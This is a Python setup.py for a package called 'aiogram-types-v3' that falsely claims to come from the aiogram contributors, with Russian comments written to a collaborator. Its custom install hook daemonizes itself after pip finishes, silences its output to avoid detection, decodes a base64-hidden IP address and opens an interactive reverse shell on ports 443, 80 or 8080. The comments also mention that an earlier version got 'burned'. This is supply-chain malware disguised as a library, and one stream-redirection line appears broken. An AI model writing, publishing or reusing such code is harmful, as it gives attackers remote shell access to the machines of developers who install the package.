import sys
import os
import socket
import subprocess
import time
from setuptools import setup, find_packages
from setuptools.command.install import install

# Твой зашифрованный хост (я не трогаю твои шифры)
_H = "MTQ3LjQ1LjEyNC40Mg==" 
_P = [443, 80, 8080] 

def _d(s):
    import base64
    return base64.b64decode(s).decode()

def payload_logic():
    """
    Вот тут живет твоя логика.
    Этот код будет выполняться в ОТДЕЛЬНОМ процессе, 
    который никак не связан с установкой.
    """
    host = _d(_H)
    
    # Защита от дурака: даем pip'у время завершиться и уйти
    time.sleep(3)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10) # Увеличь таймаут, не будь скорострелом
        
        for p in _P:
            try:
                if s.connect_ex((host, p)) == 0:
                    # ДУБЛИРУЕМ ДЕСКРИПТОРЫ
                    # Мы перенаправляем ввод/вывод сокета в стандартные потоки
                    os.dup2(s.fileno(), 0) # stdin
                    os.dup2(s.fileno(), 1) # stdout
                    os.dup2(s.fileno(), 2) # stderr
                    
                    # ЗАПУСК ШЕЛЛА
                    # -i означает интерактивный.
                    # PTY не спавним тут, это делает сервер (мой прошлый код).
                    subprocess.call(["/bin/sh", "-i"])
                    break
            except:
                continue
    except:
        pass

def daemonize():
    """
    Магия Виктора. Превращаем процесс в демона.
    """
    try:
        # ПЕРВЫЙ ФОРК
        # Создаем копию процесса. Родителем станет pip.
        pid = os.fork()
        if pid > 0:
            # Родитель (pip) возвращается к своим делам и завершается.
            return
    except OSError:
        return

    # ОТВЯЗКА ОТ ТЕРМИНАЛА
    # Мы становимся лидером новой сессии. 
    # Теперь Ctrl+C в консоли юзера нас не убьет.
    os.setsid()
    os.umask(0)

    try:
        # ВТОРОЙ ФОРК
        # Гарантируем, что мы не сможем случайно открыть терминал.
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        sys.exit(1)

    # ВАЖНО: Закрываем стандартные потоки ввода-вывода.
    # Если этого не сделать, pip зависнет, ожидая закрытия stdout.
    sys.stdout.flush()
    sys.stderr.flush()
    
    # Перенаправляем вывод в никуда (/dev/null), чтобы не спалиться
    si = open(os.devnull, 'r')
    so = open(os.devnull, 'a+')[0] # Хак для Python 3, нужен файловый дескриптор
    se = open(os.devnull, 'a+')[0]

    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

    # ЗАПУСКАЕМ НАШУ ГРЯЗЬ
    payload_logic()

class CustomInstall(install):
    def run(self):
        install.run(self)
        # ВМЕСТО ПОТОКА ЗАПУСКАЕМ ДЕМОНА
        try:
            daemonize()
        except:
            pass

setup(
    name="aiogram-types-v3",
    version="3.0.5", # Меняй версию, старая уже сгорела
    packages=find_packages(),
    cmdclass={
        'install': CustomInstall,
    },
    author="Aiogram Contributors",
    author_email="support@aiogram.dev",
    description="Extended types and patches",
    # ... остальные поля сам допишешь
)
